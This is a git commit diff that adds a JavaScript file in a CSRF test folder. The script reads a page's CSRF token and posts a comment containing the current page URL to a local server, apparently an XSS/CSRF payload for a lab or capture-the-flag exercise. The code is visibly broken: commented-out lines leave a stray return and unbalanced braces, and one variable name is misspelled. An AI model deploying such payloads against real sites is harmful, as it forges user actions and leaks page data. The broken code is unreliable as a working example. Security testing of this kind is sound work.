8e25501ac6e3f9233eb8baca65bf35ff7d40f25f
/hello <czavaleta93@gmail.com>
2021-11-03 20:25:47 -0500

    Update and rename testcsrfpost10.js to testcsrfpost11/test11.js

---
+++ testcsrfpost11/test11.js
@@ -0,0 +1,16 @@
+//fetch("http://127.0.0.1:9000/view/c8011b4f-0f8d-48b1-8195-c3914095795f").then((res) => {
+	return res.text();
+//}).then(data => {
+	var csrf = document.querySelector("[name=csrfmiddlewaretoken]").value;;
+	var formData = new FormData();
+
+	formData.append("csrfmiddlewaretoken", csrf);
+	formData.append("creator", "fromBot2");
+	foremData.append("body", window.location.href);
+
+	fetch("http://127.0.0.1:9000/comment/ca5c0e56-eeaa-4bbc-a629-43de84db56c7",{
+		method: 'POST',
+		body: formData
+	});
+
+//})
